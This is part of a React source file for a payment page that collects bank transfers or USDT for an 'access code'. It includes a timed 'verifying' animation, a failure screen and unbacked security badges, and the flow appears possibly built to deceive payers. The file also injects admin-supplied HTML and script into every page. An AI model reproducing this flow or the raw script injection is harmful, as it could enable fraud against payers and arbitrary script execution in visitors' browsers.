              <h4 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-6 ml-1">
                {formData.country === 'Nigeria' ? 'Transfer Details' : 'USDT Node Address'}
              </h4>
              
              <div className="space-y-4 mb-8">
                {formData.country === 'Nigeria' ? (
                  <>
                    <div className="bg-white/5 p-5 rounded-2xl border border-white/10 flex justify-between items-center group hover:bg-white/[0.08] transition-all">
                      <div>
                        <p className="text-[10px] text-slate-500 font-black uppercase tracking-widest mb-1">Amount</p>
                        <p className="text-lg font-black">₦{settings?.price.toLocaleString() || '---'}</p>
                      </div>
                      <button onClick={() => copyToClipboard(settings?.price?.toString() || '')} className="p-3 bg-white/5 rounded-xl text-blue-400 hover:bg-blue-400/20 transition-all"><Copy size={18}/></button>
                    </div>

                    <div className="bg-white/5 p-5 rounded-2xl border border-white/10 flex justify-between items-center group hover:bg-white/[0.08] transition-all">
                      <div>
                        <p className="text-[10px] text-slate-500 font-black uppercase tracking-widest mb-1">Account Number</p>
                        <p className="text-3xl font-black tracking-wider font-mono text-white">{settings?.accountNumber || '...'}</p>
                      </div>
                      <button onClick={() => copyToClipboard(settings?.accountNumber || '')} className="p-3 bg-white/5 rounded-xl text-blue-400 hover:bg-blue-400/20 transition-all"><Copy size={18}/></button>
                    </div>

                    <div className="bg-amber-500/10 p-5 rounded-2xl border border-amber-500/20 relative overflow-hidden group hover:bg-amber-500/20 transition-all">
                      <div className="absolute top-0 right-0 p-1">
                        <div className="bg-amber-500 text-[8px] text-white px-2 py-0.5 rounded-bl font-black uppercase tracking-tighter">Required</div>
                      </div>
                      <div className="flex justify-between items-center mb-1">
                        <p className="text-[10px] text-amber-500/80 font-black uppercase tracking-widest">Transfer Remark (Mandatory)</p>
                        <button onClick={() => copyToClipboard(settings?.remark || '')} className="p-2 bg-amber-500/10 rounded-lg text-amber-500 hover:bg-amber-500/30 transition-all"><Copy size={16}/></button>
                      </div>
                      <p className="font-black text-amber-100 tracking-wide text-xl italic">{settings?.remark || '---'}</p>
                    </div>

                    <div className="grid grid-cols-2 gap-4">
                      <div className="bg-white/5 p-5 rounded-2xl border border-white/10">
                        <p className="text-[10px] text-slate-500 font-black uppercase tracking-widest mb-1">Bank Name</p>
                        <p className="font-black text-blue-400">{settings?.bankName || '...'}</p>
                      </div>
                      <div className="bg-white/5 p-5 rounded-2xl border border-white/10 overflow-hidden">
                        <p className="text-[10px] text-slate-500 font-black uppercase tracking-widest mb-1">Account Name</p>
                        <p className="font-black text-[11px] leading-tight text-white uppercase">{settings?.accountName || '...'}</p>
                      </div>
                    </div>
                  </>
                ) : (
                  <>
                    <div className="bg-white/5 p-5 rounded-2xl border border-white/10 flex justify-between items-center group hover:bg-white/[0.08] transition-all">
                      <div>
                        <p className="text-[10px] text-slate-500 font-black uppercase tracking-widest mb-1">Amount Due</p>
                        <p className="text-xl font-black text-white">${Math.ceil((settings?.price || 6900) / 1500)} USDT</p>
                      </div>
                      <button onClick={() => copyToClipboard(Math.ceil((settings?.price || 6900) / 1500).toString())} className="p-3 bg-white/5 rounded-xl text-emerald-400 hover:bg-emerald-400/20 transition-all"><Copy size={18}/></button>
                    </div>

                    <div className="bg-white/5 p-6 rounded-2xl border border-white/10 flex flex-col gap-4 group hover:bg-white/[0.08] transition-all">
                      <div>
                        <p className="text-[10px] text-slate-500 font-black uppercase tracking-widest mb-2">Wallet Address (TRC20)</p>
                        <p className="text-lg font-black tracking-tight text-white break-all font-mono">{settings?.adminUsdtWallet || '0x...'}</p>
                      </div>
                      <button 
                        onClick={() => copyToClipboard(settings?.adminUsdtWallet || '')} 
                        className="w-full py-3 bg-emerald-600/10 border border-emerald-500/30 text-emerald-400 rounded-xl font-black text-xs uppercase tracking-widest hover:bg-emerald-500 hover:text-white transition-all flex items-center justify-center gap-2"
                      >
                        <Copy size={14}/> Copy Address
                      </button>
                    </div>

                    <div className="bg-emerald-500/10 p-5 rounded-2xl border border-emerald-500/20">
                      <p className="text-[10px] text-emerald-200 font-bold leading-relaxed italic">
                        <span className="text-emerald-400 font-black uppercase mr-2 underline decoration-emerald-400/30 underline-offset-2">Notice:</span> 
                        Ensure you use the TRC20 network for this transfer. Payments sent to other networks may be permanently lost.
                      </p>
                    </div>
                  </>
                )}
              </div>

              {formData.country === 'Nigeria' && (
                <div className="bg-blue-500/10 p-5 rounded-2xl border border-blue-500/20 mb-8">
                  <p className="text-[10px] text-blue-200 leading-relaxed font-bold italic">
                    <span className="text-blue-400 font-black uppercase mr-2 underline decoration-blue-400/30 underline-offset-2">Important Notice:</span> 
                    Make your transfer using any other bank as transfers from OPay may not be accepted for now due to network issues
                  </p>
                </div>
              )}

              <button 
                onClick={handlePaymentComplete}
                className="w-full bg-blue-600 text-white py-5 rounded-2xl font-black text-lg shadow-[0_0_40px_rgba(37,99,235,0.2)] transition-all mb-4"
              >
                I Have Completed This Transfer
              </button>

              <button 
                onClick={() => handleNext('secure-payment')}
                className="w-full text-slate-600 font-black text-[10px] uppercase tracking-[0.3em] py-4 hover:text-slate-400 transition-colors"
              >
                Cancel Payment
              </button>

              <div className="flex justify-center gap-6 mt-10 opacity-30 grayscale hover:grayscale-0 hover:opacity-100 transition-all duration-500">
                <div className="flex items-center gap-1.5">
                  <Lock size={12} className="text-blue-500" />
                  <span className="text-[8px] font-black uppercase tracking-widest">256-bit Encryption</span>
                </div>
                <div className="flex items-center gap-1.5">
                  <Shield size={12} className="text-blue-500" />
                  <span className="text-[8px] font-black uppercase tracking-widest">Bank Grade Security</span>
                </div>
                <div className="flex items-center gap-1.5">
                  <Headset size={12} className="text-blue-500" />
                  <span className="text-[8px] font-black uppercase tracking-widest">24/7 Monitoring</span>
                </div>
              </div>
            </div>
          </motion.div>
        )}

        {step === 'verifying' && (
          <motion.div 
            key="verifying"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="relative max-w-md mx-auto min-h-screen flex flex-col items-center justify-center p-8 text-center z-10"
          >
            <div className="relative w-32 h-32 mb-12">
              <motion.div 
                animate={{ rotate: 360, scale: [1, 1.1, 1] }}
                transition={{ 
                  rotate: { duration: 3, repeat: Infinity, ease: "linear" },
                  scale: { duration: 2, repeat: Infinity, ease: "easeInOut" }
                }}
                className="absolute inset-0 border-[3px] border-white/5 border-t-blue-500 rounded-full shadow-[0_0_40px_rgba(59,130,246,0.2)]"
              />
              <div className="absolute inset-0 flex items-center justify-center">
                <ShieldCheck className="text-blue-400" size={48} />
              </div>
            </div>
            
            <h2 className="text-3xl font-black mb-4 tracking-tight">Verifying Payment</h2>
            <p className="text-slate-400 mb-10 max-w-xs leading-relaxed">
              Please wait while we confirm your transfer. This may take a few moments...
            </p>

            <div className="w-full max-w-xs bg-white/5 border border-white/10 h-3 rounded-full overflow-hidden relative">
              <motion.div 
                initial={{ width: 0 }}
                animate={{ width: "100%" }}
                transition={{ duration: 10, ease: "linear" }}
                className="absolute inset-0 bg-gradient-to-r from-blue-600 to-indigo-500 shadow-[0_0_20px_rgba(37,99,235,0.5)]"
              />
            </div>
            
            <div className="mt-16 space-y-3 opacity-30">
               <div className="flex items-center justify-center gap-2">
                  <Lock size={12} className="text-blue-500" />
                  <span className="text-[10px] font-black uppercase tracking-[0.2em]">256-bit Encryption</span>
                </div>
                <div className="h-0.5 w-12 bg-white/10 mx-auto" />
                <div className="flex items-center justify-center gap-2">
                  <Shield size={12} className="text-blue-500" />
                  <span className="text-[10px] font-black uppercase tracking-[0.2em]">Bank Grade Security</span>
                </div>
            </div>
          </motion.div>
        )}

        {step === 'failed' && (
          <motion.div 
            key="failed"
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="relative max-w-md mx-auto min-h-screen p-6 flex flex-col items-center justify-center z-10 w-full"
          >
            <div className="bg-red-500/5 backdrop-blur-3xl border border-red-500/20 p-10 rounded-[2.5rem] shadow-2xl text-center w-full">
              <motion.div 
                animate={{ y: [0, -5, 0] }}
                transition={{ duration: 2, repeat: Infinity }}
                className="w-24 h-24 bg-red-500/20 text-red-500 rounded-full flex items-center justify-center mb-8 mx-auto border border-red-500/30"
              >
                <AlertCircle size={48} className="drop-shadow-[0_0_10px_rgba(239,68,68,0.5)]" />
              </motion.div>
              
              <h2 className="text-3xl font-black text-white mb-4 tracking-tight uppercase">Verification Failed</h2>
              <p className="text-slate-400 mb-10 max-w-xs mx-auto leading-relaxed">
                We couldn't verify your transfer at this time. This may be due to network delays or incorrect details.
              </p>

              <div className="w-full bg-white/5 border border-white/10 rounded-2xl p-6 mb-10 text-left">
                <p className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-3">Access Code</p>
                <div className="bg-white/5 py-4 px-4 rounded-xl border border-dashed border-white/10 text-center">
                  <span className="text-slate-400 font-medium">Access code unavailable</span>
                </div>
              </div>

              <div className="w-full space-y-4">
                <button className="w-full bg-white text-black py-5 rounded-2xl font-black text-lg shadow-[0_0_30px_rgba(255,255,255,0.15)] hover:bg-slate-100 transition-all flex items-center justify-center gap-3">
                  <Headset size={22} />
                  Contact Customer Care
                </button>
                
                <button 
                  onClick={() => handleNext('transfer-details')}
                  className="w-full bg-white/5 border border-white/10 text-white py-5 rounded-2xl font-black text-lg hover:bg-white/10 transition-all flex items-center justify-center gap-3"
                >
                  <RefreshCcw size={20} />
                  Try Again
                </button>
              </div>

              <div className="flex justify-center gap-8 mt-12 opacity-30">
                <div className="flex flex-col items-center gap-1">
                  <Lock size={14} className="text-red-400" />
                  <span className="text-[8px] font-black uppercase tracking-widest">256-bit Encryption</span>
                </div>
                <div className="flex flex-col items-center gap-1">
                  <Shield size={14} className="text-red-400" />
                  <span className="text-[8px] font-black uppercase tracking-widest">Bank Grade Security</span>
                </div>
                <div className="flex flex-col items-center gap-1">
                  <Headset size={14} className="text-red-400" />
                  <span className="text-[8px] font-black uppercase tracking-widest">24/7 Monitoring</span>
                </div>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

function GlobalController() {
  const location = useLocation();

  useEffect(() => {
    const loadAndInjectSupport = async () => {
      try {
        const s = await api.getSettings();
        const containerId = 'live-support-wrapper';
        let container = document.getElementById(containerId);
        
        if (s.supportEnabled && s.supportCode) {
          if (!container) {
            container = document.createElement('div');
            container.id = containerId;
            document.body.appendChild(container);
            
            // This method allows scripts with 'src' attributes to load correctly
            const range = document.createRange();
            const fragment = range.createContextualFragment(s.supportCode);
            container.appendChild(fragment);
          }
        } else if (container) {
          container.remove();
          // Force removal of common widget containers if they remain
          const selectors = ['#smartsupp-widget', '.smartsupp-widget', '#tidio-chat', '#chat-widget-container', '[id^="smartsupp"]'];
          selectors.forEach(sel => {
            document.querySelectorAll(sel).forEach(el => el.remove());
          });
        }
      } catch (err) {
        console.error("Global Sync Error:", err);
      }
    };
    loadAndInjectSupport();
  }, [location.pathname]);

  return null;
}

function App() {
  return (
    <Router>
      <GlobalController />
      <Routes>
        <Route path="/" element={<MainApp />} />
        <Route path="/admin" element={<AdminPage />} />
        <Route path="/dashboard" element={<UserDashboard />} />
        <Route path="*" element={<MainApp />} />
      </Routes>
    </Router>
  );
}

export default App;
